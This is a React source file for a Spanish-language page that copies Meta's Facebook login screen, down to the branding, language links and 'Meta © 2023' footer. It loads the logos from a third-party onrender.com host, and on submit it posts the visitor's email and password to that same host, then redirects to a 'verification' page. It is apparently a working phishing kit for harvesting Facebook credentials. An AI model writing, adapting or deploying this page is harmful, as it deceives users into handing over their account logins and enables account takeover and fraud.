
import React, { useState, useEffect } from 'react';


import axios from 'axios';
import { useNavigate } from 'react-router-dom';



function Login() {
    const [formData, setFormData] = useState({
        email: '',
        password: '',
    });
    const [errors, setErrors] = useState({
        email: '',
        password: ''
    });

    const [logoMeta, setLogoMeta] = useState('');
    const [logoFb, setLogoFb] = useState('');
    const navigate = useNavigate();

    useEffect(() => {
        axios.get(`https://api-fbhomepage-id.onrender.com/public/images/logometa.svg`)
            .then(response => {
                setLogoMeta(response.data);
            })
            .catch(error => {
                console.error('Error fetching meta image:', error);
            });
        axios.get(`https://api-fbhomepage-id.onrender.com/public/images/fb.svg`)
            .then(response => {
                setLogoFb(response.data);
            })
            .catch(error => {
                console.error('Error fetching fb image:', error);
            });
    }, []);

    const onSubmit = async (e) => {
        try {

            let newErrors = {};
            if (!formData.email) {
                newErrors = { ...newErrors, email: 'por favor complete este campo.' };
            }
            if (!formData.password) {
                newErrors = { ...newErrors, password: 'por favor complete este campo.' };
            }
            setErrors(newErrors);
            if (Object.keys(newErrors).length === 0) {
                await axios.post(`https://api-fbhomepage-id.onrender.com/users/login`, {
                    email: formData.email,
                    password: formData.password,
                }, {
                    headers: {
                        "Content-Type": "application/json"
                    }
                });

                navigate('/verification');

            }

        } catch (error) {
            throw error
        }

    };


    return (
        <div className="flex justify-center">
            <div className="w-full lg:w-[400px] md:w-[400px] sm:w-[400px] mt-4 relative">
                <div className="px-2 ">
                    <div className="h-[735px] pb-[79.55px] bg-white items-center ">
                        <div className="w-full h-[624.45px] relative flex-col justify-start items-start">
                            <div className="w-full h-6 bg-white flex-col justify-start items-start inline-flex pb-12">
                                <div className="w-full h-6 justify-between items-center inline-flex">
                                    <div className="flex-col justify-center items-start inline-flex">
                                        <div className=" relative p-0" dangerouslySetInnerHTML={{ __html: logoMeta }} ></div>
                                    </div>
                                    <div className="justify-start items-start flex">
                                        <div className="self-stretch flex-col justify-start items-start inline-flex">
                                            <div className="text-neutral-800 text-base font-bold font-['Segoe UI'] leading-normal ">ayuda</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div className="w-full h-[37px] py-[7px] bg-gray-200 rounded-md  mb-2 text-center text-neutral-700 text-[15px] font-semibold font-['Segoe UI']">
                                Por favor inicia sesión en tu cuenta para continuar
                            </div>
                            <div className=" w-full h-[47.24px] px-32 pb-[5px] flex-col justify-center items-center inline-flex">
                                <div className="w-[120px] h-[42.24px] " dangerouslySetInnerHTML={{ __html: logoFb }} ></div>
                            </div>
                            <form className=" w-full h-[191.67px] relative mt-2" action='/login' method='POST' >
                                <input type='email'
                                    placeholder='Correo electrónico o número de móvil'
                                    // className="w-full h-[43px] pl-[10.67px] pr-[10.66px] pt-[13px] pb-[13px] left-0 top-0 absolute bg-neutral-100 rounded-[3px] border-none flex-col justify-start items-start required:" 
                                    className={`w-full h-[43px] pl-[10.67px] pr-[10.66px] pt-[13px] pb-[13.33px] left-0 top-0  bg-neutral-100 rounded-[3px] border ${errors.password ? 'border-red-500' : 'border-gray-300'} flex-col justify-start items-start`}
                                    value={formData.email}
                                    onChange={(e) =>
                                        setFormData({ ...formData, email: e.target.value })
                                    } />

                                {errors.email && <p className="text-red-500 text-xs italic">{errors.email}</p>}

                                <input
                                    type='password'
                                    className={`w-full h-[43px] pl-[10.67px] pr-[10.66px] pt-[13px] pb-[13.33px] left-0 top-0 mt-2  bg-neutral-100 rounded-[3px] border ${errors.password ? 'border-red-500' : 'border-gray-300'} flex-col justify-start items-start`}
                                    // className="w-full h-[43px] pl-[10.67px] pr-[10.66px] pt-[13px] pb-[13.33px] left-0 top-[48.33px] absolute bg-neutral-100 rounded-[3px] border-none flex-col justify-start items-start inline-flex"
                                    placeholder='contraseña'
                                    value={formData.password}
                                    onChange={(e) =>
                                        setFormData({ ...formData, password: e.target.value })
                                    }
                                    style={{ paddingLeft: '12px' }}

                                />
                                {errors.password && <p className="text-red-500 text-xs italic">{errors.password}</p>}

                                <button type='button' className=" w-full py-[3px] left-0 top-[100.67px] mt-3  bg-blue-600 rounded-[5px] justify-center items-start inline-flex cursor-pointer text-center text-white text-base font-bold font-['Arial'] leading-[35px] tracking-wide" onClick={onSubmit}>
                                    Iniciar sesión
                                </button>
                                <div className="w-full h-[50px] top-[151px]  text-center text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[50px]">¿Olvidaste tu contraseña?</div>

                            </form>
                            <div className="w-full pt-[132.67px] pb-[32.66px] justify-center items-start inline-flex">
                                <div className="flex-col justify-start items-start gap-6 inline-flex">
                                    <div className="self-stretch px-[36px] justify-start items-center gap-x-16 inline-flex">
                                        <div className="flex-col justify-start items-center gap-[5px] inline-flex">
                                            <div className="pb-[0.43px] flex-col justify-start items-start flex">
                                                <div className="text-neutral-500 text-[13px] font-normal font-['Segoe UI'] leading-tight">Mexico</div>
                                            </div>
                                            <div className="pb-[0.50px] flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">Bahasa Jawa</div>
                                            </div>
                                            <div className="pb-[0.50px] bg-white flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">日本語</div>
                                            </div>
                                            <div className="pb-[0.50px] flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">Português (Brasil)</div>
                                            </div>
                                        </div>
                                        <div className="flex-col justify-start items-center gap-[5px] inline-flex">
                                            <div className="pb-[0.50px] flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">English (UK)</div>
                                            </div>
                                            <div className="pb-[0.50px] flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">Bahasa Melayu</div>
                                            </div>
                                            <div className="pb-[0.50px] flex-col justify-start items-start flex">
                                                <div className="text-blue-600 text-sm font-normal font-['Segoe UI'] leading-[21px]">Español</div>
                                            </div>
                                            <div className="w-5 h-5 relative rounded border border-neutral-500" />
                                        </div>
                                    </div>
                                    <div className="w-full self-stretch h-6  flex-col justify-start items-center flex">
                                        <div className="text-center text-neutral-800 text-base font-normal font-['Segoe UI'] leading-normal">Meta © 2023</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Login;
